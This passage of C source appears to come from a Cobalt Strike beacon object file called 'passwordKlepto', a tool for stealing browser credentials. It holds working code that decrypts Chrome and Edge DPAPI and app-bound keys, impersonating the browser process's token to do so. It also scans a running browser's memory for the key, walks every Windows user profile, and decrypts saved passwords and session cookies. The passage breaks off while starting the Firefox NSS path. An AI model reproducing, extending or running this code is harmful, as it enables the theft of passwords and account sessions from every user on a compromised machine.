        b64key = ExtractKey(lsbuf, "\"encrypted_key\":\"", &klen);
        if (b64key && klen) {
            char sav; unsigned char *raw = NULL; size_t rlen = 0;
            sav = b64key[klen]; b64key[klen] = 0;
            raw = Base64Decode(b64key, &rlen);
            b64key[klen] = sav;
            if (raw && rlen >= 5 && MSVCRT$memcmp(raw, "DPAPI", 5) == 0) {
                DATA_BLOB in, out; BOOL ok;
                in.pbData = raw + 5; in.cbData = (DWORD)rlen - 5;
                if (browserPid) impersonating = StealAndImpersonate(browserPid);
                ok = CRYPT32$CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out);
                if (impersonating) ADVAPI32$RevertToSelf();
                if (ok && out.cbData >= 32) {
                    v10key = (unsigned char *)intAlloc(32);
                    if (v10key) MSVCRT$memcpy(v10key, out.pbData, 32);
                    KERNEL32$LocalFree(out.pbData);
                    add_key(cx, v10key);
                } else {
                    BeaconPrintf(CALLBACK_ERROR, "[!] v10 DPAPI CryptUnprotectData failed (err=%lu)", ok ? 0 : KERNEL32$GetLastError());
                }
            }
            if (raw) intFree(raw);
        }
        intFree(lsbuf);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] cannot read Local State: %s", localStatePath);
    }

    /* v20: app-bound key blob -> derive candidates (--no-v20 skips this) */
    if (doV20) {
    keyBlob = GetAppBoundKeyBlob(localStatePath, browser, browserPid, &keyBlobLen);
    if (keyBlob && keyBlobLen) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] got app-bound key blob (%lu bytes)", keyBlobLen);
        /* modern format: DecryptData returns the final 32-byte AES key directly
         * (xaitax-style, Chrome 127+/Edge 144+). Use it as-is. */
        if (keyBlobLen == 32) {
            add_key(cx, keyBlob);
        }
        /* old format: 0x03 || 32B CNG-encrypted -> CNG unwrap */
        if (keyBlobLen == 33 && keyBlob[0] == 0x03) {
            unsigned char *chromeKey = CngUnwrapChromeKey(keyBlob + 1);
            if (chromeKey) {
                unsigned char xord[32];
                add_key(cx, chromeKey);
                xor32(chromeKey, FLAG3_XOR, xord);
                add_key(cx, xord);
                intFree(chromeKey);
            }
        }
        /* new flag format: [flag|iv(12)|ct(32)|tag(16)] = 61 (flag1/2) or 93 (flag3) */
        if (keyBlobLen == 61 || keyBlobLen == 93) {
            unsigned char flag = keyBlob[0];
            const unsigned char *iv, *ct, *tag; DWORD ctLen; int chacha = 0;
            const unsigned char *useKey = NULL;
            unsigned char *flag1key = NULL, *derKey = NULL, xord[32];
            DWORD olen = 0; BOOL ok = FALSE;
            if (keyBlobLen == 61) { iv = keyBlob + 1; ct = keyBlob + 13; ctLen = 32; tag = keyBlob + 45; }
            else { iv = keyBlob + 33; ct = keyBlob + 45; ctLen = 32; tag = keyBlob + 77; }  /* flag3 */
            if (flag == 1) { size_t l = 0; flag1key = Base64Decode(FLAG1_B64, &l); useKey = flag1key; chacha = 0; }
            else if (flag == 2) { useKey = FLAG2_KEY; chacha = 1; }
            else if (flag == 3) {
                /* flag3 needs chromeKey (CNG) — try CNG on key_blob[1:33] as a heuristic */
                unsigned char *chromeKey = CngUnwrapChromeKey(keyBlob + 1);
                if (chromeKey) { xor32(chromeKey, FLAG3_XOR, xord); useKey = xord; chacha = 0; intFree(chromeKey); }
            }
            if (useKey) {
                derKey = AesGcmDecrypt(useKey, iv, ct, ctLen, tag, &olen, &ok, chacha);
                if (derKey && olen >= 32) { add_key(cx, derKey); }
                if (derKey) intFree(derKey);
            }
            if (flag1key) intFree(flag1key);
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] no app-bound v20 key (modern Chrome/Edge may need beacon as the browser user or SYSTEM+pid)");
    }
    if (keyBlob) intFree(keyBlob);
    } /* end if (doV20) */
    if (v10key) intFree(v10key);
}

/* ----------------------------------------------------------------------
 *  User-profile enumeration (SYSTEM-robust) — see browserHistory.c / LESSONS.
 *  SHGetFolderPathA(CSIDL_LOCAL_APPDATA) under a SYSTEM beacon returns
 *  systemprofile's AppData, NOT the real user's, so browser data is never
 *  found. Enumerate HKLM\...\ProfileList and check EVERY user's AppData\Local
 *  (Chromium) / AppData\Roaming (Firefox) instead. Works whether the beacon is
 *  SYSTEM (sees all users) or a user (sees its own profile).
 * -------------------------------------------------------------------- */
typedef void (*ProfCb)(const char *profileDirA, void *ctx);

static void ForEachUserProfile(ProfCb cb, void *ctx) {
    HKEY hList = NULL;
    DWORD idx = 0;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList",
            0, KEY_READ, &hList) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] cannot open ProfileList (HKLM) — per-user browser data won't be found");
        return;
    }
    for (;;) {
        wchar_t sid[256]; HKEY hSid = NULL; LONG r;
        r = ADVAPI32$RegEnumKeyW(hList, idx++, sid, 256);
        if (r != 0) break;
        if (ADVAPI32$RegOpenKeyExW(hList, sid, 0, KEY_READ, &hSid) == 0) {
            wchar_t pathW[MAX_PATH], expW[MAX_PATH];
            DWORD len = sizeof(pathW), type = 0;
            if (ADVAPI32$RegQueryValueExW(hSid, L"ProfileImagePath", NULL, &type, (LPBYTE)pathW, &len) == 0 && len) {
                char profA[MAX_PATH];
                pathW[len / sizeof(wchar_t)] = 0;
                KERNEL32$ExpandEnvironmentStringsW(pathW, expW, MAX_PATH);
                KERNEL32$WideCharToMultiByte(CP_ACP, 0, expW, -1, profA, MAX_PATH, NULL, NULL);
                cb(profA, ctx);
            }
            ADVAPI32$RegCloseKey(hSid);
        }
    }
    ADVAPI32$RegCloseKey(hList);
}

typedef struct {
    const char *browser;
    const char *subPath;   /* "\\Google\\Chrome\\User Data" or "\\Microsoft\\Edge\\User Data" */
    DWORD browserPid;
    int doV20;
    int scanMode;          /* --scan: recover v20 key from a running browser's memory */
    int userFound;
} CrEnumCtx;

/* ----------------------------------------------------------------------
 *  -scan mode helpers — recover the v20 app-bound AES key by reading it out
 *  of an already-running chrome.exe/msedge.exe's memory (the std-user path,
 *  no SYSTEM / no hollowing / no child process). The key only lands in the
 *  browser process's RAM once Chrome autofills a saved v20 login (which forces
 *  the app-bound decryption); the operator ensures that by opening the saved
 *  login page, then runs `passwordKlepto -b chrome --scan [-p pid]`. We scan
 *  committed RW regions for a 32-byte window that (a) looks like a key and
 *  (b) GCM-decrypts a v20 Login Data blob (the existing tag oracle). Ported
 *  from the OSAI Pipeline Breach T10 abe_login_extractor (xaitax memory
 *  analysis), lab-validated. MITRE T1555.003.
 * -------------------------------------------------------------------- */

/* plausible-AES-key heuristic: high byte diversity, few 0x00/0xFF runs.
 * Adapted from abe_login_extractor.cpp::LooksLikeKey, but uses an O(n^2)
 * duplicate scan instead of a 256-byte tracking array — avoids any memset
 * libcall (the Creds-BOF CFLAGS has no -fno-tree-loop-distribute-patterns). */
static int looks_like_key(const unsigned char *p) {
    int unique = 0, zeros = 0, ffs = 0, i, j, dup;
    for (i = 0; i < 32; i++) {
        unsigned char b = p[i];
        if (b == 0x00) zeros++;
        if (b == 0xFF) ffs++;
        dup = 0;
        for (j = 0; j < i; j++) if (p[j] == b) { dup = 1; break; }
        if (!dup) unique++;
    }
    if (unique < 20) return 0;
    if (zeros > 4 || ffs > 4) return 0;
    return 1;
}

/* scan one process's committed RW regions (<= SCAN_MAX_REGION) for a 32-byte
 * key that GCM-decrypts the v20 validation blob (nonce@+3, ct@+15, tag@end-16).
 * Returns 1 and copies 32 bytes into outKey on success. */
static int scan_proc_for_key(DWORD pid, const unsigned char *blob, int blobLen,
                             unsigned char *outKey, DWORD deadlineTick) {
    HANDLE hProc;
    SYSTEM_INFO si;
    MEMORY_BASIC_INFORMATION mbi;
    unsigned char *buf;
    unsigned char *addr;
    const unsigned char *nonce, *ct, *tag;
    DWORD ctLen;

    if (blobLen < 32) return 0;   /* need v20(3)+nonce(12)+ct(>=1)+tag(16) */
    hProc = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return 0;

    KERNEL32$GetSystemInfo(&si);
    addr = (unsigned char *)si.lpMinimumApplicationAddress;
    buf = (unsigned char *)intAlloc(SCAN_MAX_REGION);
    if (!buf) { KERNEL32$CloseHandle(hProc); return 0; }

    nonce = blob + 3;
    ct    = blob + 15;
    ctLen = (DWORD)blobLen - 15 - 16;
    tag   = blob + blobLen - 16;

    while (addr < (unsigned char *)si.lpMaximumApplicationAddress) {
        if (KERNEL32$GetTickCount() >= deadlineTick) break;
        if (KERNEL32$VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == 0) {
            addr += 0x1000; continue;
        }
        if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_READWRITE &&
            mbi.RegionSize <= SCAN_MAX_REGION) {
            SIZE_T got = 0;
            if (KERNEL32$ReadProcessMemory(hProc, mbi.BaseAddress, buf,
                                           (SIZE_T)mbi.RegionSize, &got) && got >= 32) {
                SIZE_T i;
                for (i = 0; i + 32 <= got; i += 8) {
                    BOOL ok = FALSE; DWORD olen = 0;
                    unsigned char *plain;
                    if (!looks_like_key(buf + i)) continue;
                    plain = AesGcmDecrypt(buf + i, nonce, ct, ctLen, tag, &olen, &ok, 0);
                    if (plain) intFree(plain);
                    if (ok) {
                        MSVCRT$memcpy(outKey, buf + i, 32);
                        intFree(buf);
                        KERNEL32$CloseHandle(hProc);
                        return 1;
                    }
                }
            }
        }
        addr = (unsigned char *)mbi.BaseAddress + mbi.RegionSize;
    }
    intFree(buf);
    KERNEL32$CloseHandle(hProc);
    return 0;
}

/* scan a given pid (if != 0) else every chrome.exe/msedge.exe pid, for the key.
 * SCAN_TIMEOUT_MS overall cap. Returns 1 + fills outKey on success. */
static int scan_browser_memory(DWORD scanPid, const char *browser,
                               const unsigned char *blob, int blobLen,
                               unsigned char *outKey) {
    DWORD deadline = KERNEL32$GetTickCount() + SCAN_TIMEOUT_MS;
    const char *procName = (MSVCRT$strcmp(browser, "msedge") == 0) ? "msedge.exe" : "chrome.exe";

    if (scanPid) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] scan: target %s pid %lu", browser, (unsigned long)scanPid);
        return scan_proc_for_key(scanPid, blob, blobLen, outKey, deadline);
    }
    {
        HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe;
        int scanned = 0;
        if (hSnap == INVALID_HANDLE_VALUE) return 0;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (KERNEL32$Process32First(hSnap, &pe)) {
            do {
                if (KERNEL32$GetTickCount() >= deadline) break;
                if (MSVCRT$strcmp(pe.szExeFile, procName) == 0) {
                    scanned++;
                    if (scan_proc_for_key(pe.th32ProcessID, blob, blobLen, outKey, deadline)) {
                        KERNEL32$CloseHandle(hSnap);
                        return 1;
                    }
                }
            } while (KERNEL32$Process32Next(hSnap, &pe));
        }
        KERNEL32$CloseHandle(hSnap);
        if (!scanned) BeaconPrintf(CALLBACK_ERROR, "[!] scan: no running %s process found", procName);
    }
    return 0;
}

/* v20-blob capture: walk `logins` once to grab the first v20 password_value,
 * used as the oracle validation target for the memory scan. */
typedef struct { unsigned char *blob; int len, cap, iPass; } V20CapCtx;
static void v20_capture_cb(Col *cols, int ncol, void *ctx) {
    V20CapCtx *v = (V20CapCtx *)ctx;
    if (v->len) return;
    if (v->iPass >= 0 && v->iPass < ncol &&
        (cols[v->iPass].isBlob || cols[v->iPass].isText) && cols[v->iPass].len >= 15 &&
        MSVCRT$memcmp(cols[v->iPass].ptr, "v20", 3) == 0) {
        int n = (cols[v->iPass].len < v->cap) ? cols[v->iPass].len : v->cap;
        MSVCRT$memcpy(v->blob, cols[v->iPass].ptr, n);
        v->len = n;
    }
}
static int capture_first_v20(const char *base, unsigned char *out, int cap, int *outLen) {
    WIN32_FIND_DATAA fd; HANDLE hFind;
    char searchPath[MAX_PATH], profilePath[MAX_PATH];
    static const char *loginFiles[2] = { "Login Data", "Login Data For Account" };
    int found = 0;
    MSVCRT$_snprintf(searchPath, sizeof(searchPath), "%s\\*", base);
    hFind = KERNEL32$FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;
    do {
        int lf;
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (fd.cFileName[0] == '.') continue;
        if (MSVCRT$strcmp(fd.cFileName, "Default") != 0 &&
            MSVCRT$_strnicmp(fd.cFileName, "Profile", 7) != 0) continue;
        for (lf = 0; lf < 2 && !found; lf++) {
            DWORD sz = 0, root = 0; char *db; ColMap m;
            MSVCRT$_snprintf(profilePath, sizeof(profilePath), "%s\\%s\\%s", base, fd.cFileName, loginFiles[lf]);
            db = ReadDbWithWal(profilePath, &sz);
            if (!db) continue;
            if (sqlite_map_cols((unsigned char *)db, sz, "logins",
                                "origin_url", "username_value", "password_value", &root, &m)) {
                V20CapCtx v; v.blob = out; v.cap = cap; v.len = 0; v.iPass = m.i2;
                sqlite_walk_root((unsigned char *)db, sz, root, v20_capture_cb, &v);
                if (v.len) { *outLen = v.len; found = 1; }
            }
            intFree(db);
        }
    } while (KERNEL32$FindNextFileA(hFind, &fd));
    KERNEL32$FindClose(hFind);
    return found;
}

/* per-user callback: build keys from THAT user's Local State, then decrypt each
 * of their profiles' Login Data. Keys are per-user (each user has their own
 * Local State + DPAPI-wrapped key), so the CrCtx + BuildChromiumKeys run per
 * user. Under SYSTEM, pass -p <browser pid of the target user> so v10 DPAPI /
 * the v20 double-DPAPI path impersonate that user. */
static void chromium_user_cb(const char *profA, void *ctx) {
    CrEnumCtx *e = (CrEnumCtx *)ctx;
    CrCtx cx;
    char base[MAX_PATH], localState[MAX_PATH], searchPath[MAX_PATH], profilePath[MAX_PATH];
    WIN32_FIND_DATAA fd; HANDLE hFind;
    int i, tried = 0;

    MSVCRT$_snprintf(base, sizeof(base), "%s\\AppData\\Local%s", profA, e->subPath);
    MSVCRT$_snprintf(localState, sizeof(localState), "%s\\Local State", base);

    /* skip users who don't run this browser silently (no Local State) — avoids
     * per-user error spam when enumerating every profile under SYSTEM. */
    if (KERNEL32$GetFileAttributesA(localState) == INVALID_FILE_ATTRIBUTES) return;

    for (i = 0; i < MAX_CAND_KEYS; i++) cx.keys[i] = NULL;
    cx.nKeys = 0; cx.browser = e->browser; cx.count = 0; cx.decrypted = 0;
    cx.ccount = 0; cx.cdecrypted = 0;
    cx.iOrigin = cx.iUser = cx.iPass = -1;
    cx.iHost = cx.iCName = cx.iEnc = -1;

    BeaconPrintf(CALLBACK_OUTPUT, "===== %s @ %s : building keys from %s =====", e->browser, profA, localState);
    if (e->scanMode) {
        /* std-user path: v10 DPAPI still works as the user; skip the v20 hollow
         * (needs SYSTEM) and instead recover the v20 key from browser memory. */
        unsigned char *v20blob = (unsigned char *)intAlloc(V20_BLOB_CAP);
        int v20len = 0;
        BuildChromiumKeys(&cx, localState, e->browser, e->browserPid, 0);   /* v10 only */
        if (v20blob && capture_first_v20(base, v20blob, V20_BLOB_CAP, &v20len) && v20len >= 32) {
            unsigned char scanKey[32];
            BeaconPrintf(CALLBACK_OUTPUT, "[*] scan: validating vs %d-byte v20 Login Data blob; scanning %s memory (<=30s)...", v20len, e->browser);
            if (scan_browser_memory(e->browserPid, e->browser, v20blob, v20len, scanKey)) {
                add_key(&cx, scanKey);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] scan: recovered v20 app-bound key from %s memory (added as candidate)", e->browser);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[!] scan: no key in %s memory. Ensure %s is running and has autofilled a saved v20 login (open the saved login page), then retry.", e->browser, e->browser);
            }
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] scan: no v20 Login Data blob at %s to validate against", base);
        }
        if (v20blob) intFree(v20blob);
    } else {
        BuildChromiumKeys(&cx, localState, e->browser, e->browserPid, e->doV20);
    }
    if (cx.nKeys == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] %s @ %s: no decryption keys available — skipping", e->browser, profA);
        return;
    }
    e->userFound = 1;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %s @ %s: %d candidate key(s) loaded", e->browser, profA, cx.nKeys);

    /* Default profile + every "Profile *" subdir */
    MSVCRT$_snprintf(searchPath, sizeof(searchPath), "%s\\*", base);
    hFind = KERNEL32$FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] cannot enumerate %s", base);
        for (i = 0; i < cx.nKeys; i++) if (cx.keys[i]) intFree(cx.keys[i]);
        return;
    }
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (fd.cFileName[0] == '.') continue;
        if (MSVCRT$strcmp(fd.cFileName, "Default") != 0 &&
            MSVCRT$_strnicmp(fd.cFileName, "Profile", 7) != 0) continue;

        /* Chromium stores passwords in "Login Data" (local) and, for synced
         * accounts, "Login Data For Account" — both have the same `logins`
         * schema. xaitax reads both; missing files are skipped silently. */
        {
            static const char *loginFiles[2] = { "Login Data", "Login Data For Account" };
            int lf;
            for (lf = 0; lf < 2; lf++) {
                DWORD sz = 0, root = 0; char *db; ColMap m;
                MSVCRT$_snprintf(profilePath, sizeof(profilePath), "%s\\%s\\%s", base, fd.cFileName, loginFiles[lf]);
                db = ReadDbWithWal(profilePath, &sz);
                if (!db) continue;
                tried++;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] %s : %s\\%s (%lu bytes)", e->browser, fd.cFileName, loginFiles[lf], sz);
                if (sqlite_map_cols((unsigned char *)db, sz, "logins",
                                    "origin_url", "username_value", "password_value", &root, &m)) {
                    cx.iOrigin = m.i0; cx.iUser = m.i1; cx.iPass = m.i2;
                    sqlite_walk_root((unsigned char *)db, sz, root, logins_cb, &cx);
                }
                intFree(db);
            }
        }

        /* Chromium stores cookies in "<profile>\Network\Cookies" (table `cookies`),
         * encrypted_value protected by the same ABE master key as passwords. A
         * saved-login row with an empty password_value (origin=root, username=
         * sign-in URL) is the signature of a cookie-session login, so the target
         * credential is frequently a session cookie here rather than a password. */
        {
            DWORD sz = 0, root = 0; char *db; ColMap m;
            MSVCRT$_snprintf(profilePath, sizeof(profilePath), "%s\\%s\\Network\\Cookies", base, fd.cFileName);
            db = ReadDbWithWal(profilePath, &sz);
            if (db) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] %s : %s\\Network\\Cookies (%lu bytes)", e->browser, fd.cFileName, sz);
                if (sqlite_map_cols((unsigned char *)db, sz, "cookies",
                                    "host_key", "name", "encrypted_value", &root, &m)) {
                    cx.iHost = m.i0; cx.iCName = m.i1; cx.iEnc = m.i2;
                    sqlite_walk_root((unsigned char *)db, sz, root, cookies_cb, &cx);
                }
                intFree(db);
            }
        }
    } while (KERNEL32$FindNextFileA(hFind, &fd));
    KERNEL32$FindClose(hFind);

    BeaconPrintf(CALLBACK_OUTPUT, "===== %s @ %s done: %d login(s) scanned, %d decrypted; %d cookie(s) scanned, %d decrypted =====",
                 e->browser, profA, cx.count, cx.decrypted, cx.ccount, cx.cdecrypted);
    for (i = 0; i < cx.nKeys; i++) if (cx.keys[i]) intFree(cx.keys[i]);
    (void)tried;
}

/* decrypt stored passwords for a Chromium browser across every user profile. */
static void ProcessChromium(const char *browser, const char *subPath, DWORD browserPid, int doV20, int scanMode) {
    CrEnumCtx ec;
    ec.browser = browser; ec.subPath = subPath; ec.browserPid = browserPid; ec.doV20 = doV20; ec.scanMode = scanMode; ec.userFound = 0;
    ForEachUserProfile(chromium_user_cb, &ec);
    if (!ec.userFound) BeaconPrintf(CALLBACK_OUTPUT, "[*] %s: no user with a decryptable Local State found", browser);
}

/* ----------------------------------------------------------------------
 *  Firefox NSS cleartext path
 * -------------------------------------------------------------------- */
typedef struct {
    PFN_NSS_Init              NSS_Init;
    PFN_NSS_Shutdown          NSS_Shutdown;
    PFN_PK11_GetInternalKeySlot PK11_GetInternalKeySlot;
    PFN_PK11_FreeSlot         PK11_FreeSlot;
    PFN_PK11_Authenticate     PK11_Authenticate;
    PFN_PK11SDRDecrypt        PK11SDRDecrypt;
    PFN_SECITEM_FreeItem      SECITEM_FreeItem;
} NssApi;

/* ---- optional on-disk debug log (survives a BOF crash -> pinpoints the
 *      failing call). Compiled in only with -DPWK_DEBUG. After a crash, read
 *      %TEMP%\pwk_dbg.log on the target: the LAST line is the call that
 *      faulted. BeaconPrintf is lost on a crash (delivered only when go()
 *      returns), so this file is the only durable trace. */
#ifdef PWK_DEBUG
static void dbglog(const char *msg) {
    char tmp[MAX_PATH], path[MAX_PATH]; HANDLE h; DWORD wr;
    if (!KERNEL32$GetTempPathA(sizeof(tmp), tmp)) return;
    MSVCRT$_snprintf(path, sizeof(path), "%spwk_dbg.log", tmp);
    path[sizeof(path) - 1] = 0;
    h = KERNEL32$CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    KERNEL32$WriteFile(h, msg, (DWORD)MSVCRT$strlen(msg), &wr, NULL);
    KERNEL32$WriteFile(h, "\r\n", 2, &wr, NULL);
    KERNEL32$CloseHandle(h);
}
#else
static __inline void dbglog(const char *msg) { (void)msg; }
#endif

static int ResolveFirefoxDir(char *outDir, int cap) {
    HKEY hFirefox = NULL, hMain = NULL;
    LONG r; DWORD i;
    const wchar_t *roots[2] = { L"SOFTWARE\\Mozilla\\Mozilla Firefox",
                                L"SOFTWARE\\WOW6432Node\\Mozilla\\Mozilla Firefox" };

    /* 1 – Try registry (both 64‑bit and 32‑bit hives) */
    for (i = 0; i < 2 && !hMain; i++) {
        r = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, roots[i], 0, KEY_READ, &hFirefox);
        if (r) { hFirefox = NULL; continue; }

        DWORD idx = 0; wchar_t vname[128];
        while (hMain == NULL && ADVAPI32$RegEnumKeyW(hFirefox, idx++, vname, 128) == 0) {
            wchar_t sub[256];
            MSVCRT$_snwprintf(sub, 256, L"%s\\Main", vname);
            if (ADVAPI32$RegOpenKeyExW(hFirefox, sub, 0, KEY_READ, &hMain) == 0) break;
        }
        if (hFirefox) ADVAPI32$RegCloseKey(hFirefox);
    }

    if (hMain) {
        wchar_t pathW[MAX_PATH]; DWORD len = sizeof(pathW); DWORD type = 0;
        int gotInstall = 0, gotExe = 0;
        /* "Install Directory" is ALREADY a directory — do NOT strip a path
         * component. The old code truncated every value at the last '\',
         * turning "C:\Program Files\Mozilla Firefox" into "C:\Program Files",
         * so SetDllDirectoryW pointed at the wrong dir and LoadLibraryExW
         * nss3.dll failed with 126 (ERROR_MOD_NOT_FOUND). Only "PathToExe"
         * (...\firefox.exe) needs the trailing file name stripped. */
        if (ADVAPI32$RegQueryValueExW(hMain, L"Install Directory", NULL, &type, (LPBYTE)pathW, &len) == 0 && type == REG_SZ) {
            gotInstall = 1;
        } else {
            len = sizeof(pathW); type = 0;
            if (ADVAPI32$RegQueryValueExW(hMain, L"PathToExe", NULL, &type, (LPBYTE)pathW, &len) == 0 && type == REG_SZ)
                gotExe = 1;
        }
        if (gotInstall || gotExe) {
            int j, last = -1;
            pathW[len / sizeof(wchar_t)] = 0;
            if (gotExe) {
                for (j = 0; pathW[j]; j++) if (pathW[j] == L'\\') last = j;
                if (last > 0) pathW[last] = 0;
            } else {
                /* Install Directory: strip only a trailing backslash, if any */
                j = 0; while (pathW[j]) j++;
                if (j > 0 && pathW[j - 1] == L'\\') pathW[j - 1] = 0;
            }
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, pathW, -1, outDir, cap, NULL, NULL);
            outDir[cap - 1] = 0;
            ADVAPI32$RegCloseKey(hMain);
            /* verify nss3.dll actually lives here; if the registry value is
             * stale/wrong, fall through to the filesystem fallback instead of
             * returning a dir LoadLibraryExW will fail on. */
            {
                char dll[320];
                MSVCRT$_snprintf(dll, sizeof(dll), "%s\\nss3.dll", outDir);
                dll[sizeof(dll) - 1] = 0;
                if (KERNEL32$GetFileAttributesA(dll) != INVALID_FILE_ATTRIBUTES)
                    return 1;
            }
        } else {
            ADVAPI32$RegCloseKey(hMain);
        }
    }

    /* 2 – File‑system fallback (always reachable now) */
    const char *cands[3] = {
        "C:\\Program Files\\Mozilla Firefox",
        "C:\\Program Files (x86)\\Mozilla Firefox",
        NULL
    };
    char expanded[300];
    /* Native 64‑bit Program Files (invisible to 32‑bit processes, harmless on x64 beacon) */
    if (KERNEL32$ExpandEnvironmentStringsA("%ProgramW6432%\\Mozilla Firefox", expanded, sizeof(expanded))) {
        cands[2] = expanded;
    }

    int ci;
    for (ci = 0; ci < 3 && cands[ci]; ci++) {
        char dll[300];
        MSVCRT$_snprintf(dll, sizeof(dll), "%s\\nss3.dll", cands[ci]);
        dll[sizeof(dll) - 1] = 0;
        if (KERNEL32$GetFileAttributesA(dll) != INVALID_FILE_ATTRIBUTES) {
            MSVCRT$_snprintf(outDir, cap, "%s", cands[ci]);
            outDir[cap - 1] = 0;
            return 1;
        }
    }
    return 0;
}

/* read <roamingBase>\Mozilla\Firefox\profiles.ini and find the default profile
 * path. returns the profile dir under <roamingBase>\Mozilla\Firefox\ in out.
 * roamingBase is a user's AppData\Roaming (per-user, SYSTEM-robust). */
static int FindFirefoxProfile(const char *roamingBase, char *out, int cap) {
    char ini[MAX_PATH];
    HANDLE hFile; DWORD sz = 0, rd = 0; char *buf = NULL;
    char *p, *profStart = NULL, *profEnd = NULL; DWORD plen = 0;
    int havePath = 0;

    MSVCRT$_snprintf(ini, sizeof(ini), "%s\\Mozilla\\Firefox\\profiles.ini", roamingBase);
    hFile = KERNEL32$CreateFileA(ini, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    sz = KERNEL32$GetFileSize(hFile, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) { KERNEL32$CloseHandle(hFile); return 0; }
    buf = (char *)intAlloc(sz + 1);
    if (!buf) { KERNEL32$CloseHandle(hFile); return 0; }
    KERNEL32$ReadFile(hFile, buf, sz, &rd, NULL);
    KERNEL32$CloseHandle(hFile);
    buf[sz] = 0;

    /* find "Default=Profiles/" then end at ".default-release" (cookie-monster) */
    p = MSVCRT$strstr(buf, "Default=Profiles/");
    if (p) {
        p += MSVCRT$strlen("Default=Profiles/");
        profStart = p;
        profEnd = MSVCRT$strstr(p, ".default-release");
    }
    if (profStart && profEnd) {
        plen = (DWORD)(profEnd - profStart) + MSVCRT$strlen(".default-release");
        MSVCRT$_snprintf(out, cap, "%s\\Mozilla\\Firefox\\Profiles\\%.*s", roamingBase, (int)plen, profStart);
        havePath = 1;
    } else {
        /* newer profiles.ini: [Install...] Default=... or [Profile1] Path=Profiles/... ; fall back to first "Path=" */
        p = MSVCRT$strstr(buf, "Path=Profiles/");
        if (p) {
            p += MSVCRT$strlen("Path=Profiles/");
            profStart = p;
            profEnd = MSVCRT$strchr(p, '\n');
            if (!profEnd) profEnd = buf + sz;
            while (profEnd > profStart && (profEnd[-1] == '\r' || profEnd[-1] == '\n' || profEnd[-1] == ' ')) profEnd--;
            plen = (DWORD)(profEnd - profStart);
            MSVCRT$_snprintf(out, cap, "%s\\Mozilla\\Firefox\\Profiles\\%.*s", roamingBase, (int)plen, profStart);
            havePath = 1;
        }
    }
    intFree(buf);
    return havePath;
}

/* extract a JSON "key":"value" string field into a heap copy (NUL-terminated). */
static char *json_str(const char *json, const char *key, int *outLen) {
    char pat[64]; char *p, *end;
    MSVCRT$_snprintf(pat, sizeof(pat), "\"%s\":\"", key);
    p = MSVCRT$strstr((char *)json, pat);
    if (!p) return NULL;
    p += MSVCRT$strlen(pat);
    end = MSVCRT$strchr(p, '"');
    if (!end) return NULL;
    if (outLen) *outLen = (int)(end - p);
    return p;     /* pointer into json, NOT owned */
}

static int NssDecrypt(NssApi *n, const char *b64, char *out, int outCap) {
    size_t dl = 0; unsigned char *raw = NULL; SECItem in, res; SECStatus s;
    int ret = 0;
    if (!b64) return 0;
    raw = Base64Decode(b64, &dl);
    if (!raw || !dl) { if (raw) intFree(raw); return 0; }
    in.type = siBuffer; in.data = raw; in.len = (unsigned int)dl;
    res.type = siBuffer; res.data = NULL; res.len = 0;
    dbglog("FX pre SDR");
    s = n->PK11SDRDecrypt(&in, &res, NULL);
    dbglog("FX post SDR");
    if (s == 0 && res.data && res.len) {
        int m = ((int)res.len < outCap - 1) ? (int)res.len : outCap - 1, i;
        for (i = 0; i < m; i++) out[i] = (char)res.data[i];
        out[m] = 0;
        ret = 1;
    }
    /* NSS allocated res.data; free ONLY the data buffer (freeit=0). Do NOT pass
     * freeit=1 — that makes NSS PORT_Free() the SECItem struct itself, and `res`
     * lives on THIS stack, so PORT_Free(&res) corrupts the heap and crashes the
     * beacon. (This was the crash: trace ended at "FX post SDR".) */
    if (n->SECITEM_FreeItem && res.data) n->SECITEM_FreeItem(&res, 0);
    intFree(raw);
    return ret;
}

/* full NSS lifecycle (Init -> decrypt logins.json -> Shutdown) for ONE Firefox
 * profile. NSS is global state, so Init/Shutdown must wrap each profile. */
static void ProcessOneFirefoxProfile(NssApi *n, const char *profile, const char *profA, int *count, int *dec) {
    char loginsPath[MAX_PATH];
    void *slot = NULL;
    DWORD sz = 0, rd = 0; char *json = NULL; char *cursor;
    *count = 0; *dec = 0;

    dbglog("FX pre NSS_Init");
